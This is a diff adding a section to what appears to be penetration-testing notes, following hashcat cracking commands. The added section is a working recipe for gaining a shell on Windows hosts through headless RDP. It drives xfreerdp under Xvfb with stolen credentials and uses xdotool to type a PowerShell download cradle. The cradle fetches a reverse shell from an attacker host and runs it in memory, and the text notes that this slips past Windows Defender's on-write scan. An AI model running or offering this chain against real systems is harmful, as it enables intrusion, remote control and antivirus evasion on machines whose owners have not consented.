@@ -690,3 +690,28 @@ private                 # SNMP write community
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+## Headless RDP foothold when RDP is the ONLY exec (no WinRM, not admin)
+
+A valid Windows user who is NOT in Remote Management Users (WinRM denied) and NOT a local admin
+(no psexec/smbexec) can still often log on over RDP. Drive RDP headlessly from Linux and immediately
+trade the GUI for a scriptable in-memory shell:
+
+```sh
+# 1. headless X + connect (3.x needs /cert:ignore)
+Xvfb :99 -screen 0 1280x800x24 &
+DISPLAY=:99 xfreerdp3 /v:TARGET /u:USER /p:PASS /cert:ignore /size:1280x800 +clipboard
+# 2. drive the desktop: Win+R, type a download-cradle, Enter (screenshot with `import -window root` to verify)
+DISPLAY=:99 xdotool key super+r
+DISPLAY=:99 xdotool type "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/shell.ps1')"
+DISPLAY=:99 xdotool key Return
+```
+
+The cradle pulls the reverse shell **in memory** (`DownloadString`+`IEX`), so nothing touches disk and
+Windows Defender's on-write scan never fires - the reliable delivery when a dropped `.exe`
+(msfvenom/RunasCs) gets quarantined. Verify the RDP state by grabbing the framebuffer
+(`DISPLAY=:99 import -window root out.png`) rather than typing blind. Gotchas: a forced
+"change password at next logon" blocks RDP; a stale `/etc/krb5.conf` realm makes xfreerdp waste time
+on Kerberos before NTLM fallback; reconnecting to an existing session ignores a new `/drive:` mount.
+
+<!-- promoted-slug: headless-rdp-foothold-no-winrm -->
